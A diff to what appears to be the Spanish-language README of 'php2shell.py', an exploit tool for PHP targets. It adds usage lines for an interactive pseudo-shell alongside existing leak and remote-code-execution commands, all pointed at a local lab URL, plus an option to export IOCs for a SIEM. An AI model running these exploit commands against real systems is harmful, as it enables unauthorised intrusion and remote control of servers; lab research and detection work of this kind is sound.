@@ -108,12 +108,20 @@ python3 php2shell.py leak                              # oracle de leak SIN fire
 python3 php2shell.py rce "id"                          # cadena RCE completa (reintentos)
 python3 php2shell.py rce "id" --explain --attempts 12  # narrado y con más tiradas
 
+# ⭐ PSEUDOSHELL interactiva: comandos sh completos (pipes, ';', redirecciones,
+#    stderr incluido) con salida limpia. Cada comando = leak+fire sobre un
+#    worker fresco (~30-60 s); el estado no persiste entre comandos.
+python3 php2shell.py shell
+python3 php2shell.py shell --timeout 60
+
 # La URL de la víctima SIEMPRE por parámetro (-u/--url); por defecto apunta al
 # lab propio (http://127.0.0.1:18081/t.php). Cualquier otra URL de loopback se
 # trata como target EXTERNO: sin preflight por docker y sin tocar contenedores.
-python3 php2shell.py info -u http://127.0.0.1:18082/t.php   # víctima externa
-python3 php2shell.py leak -u http://127.0.0.1:18082/t.php   # oracle sin fire
-python3 php2shell.py rce  "id" -u http://127.0.0.1:18082/t.php  # RCE externo
+python3 php2shell.py info  -u http://127.0.0.1:18082/t.php   # víctima externa
+python3 php2shell.py leak  -u http://127.0.0.1:18082/t.php   # oracle sin fire
+python3 php2shell.py rce   "id" -u http://127.0.0.1:18082/t.php  # RCE externo
+python3 php2shell.py shell -u http://127.0.0.1:18082/t.php   # shell externa
+#    (en target externo la shell solo admite comandos directos ≤ 12 bytes)
 python3 php2shell.py iocs                              # IOCs para tu SIEM
 ```
 
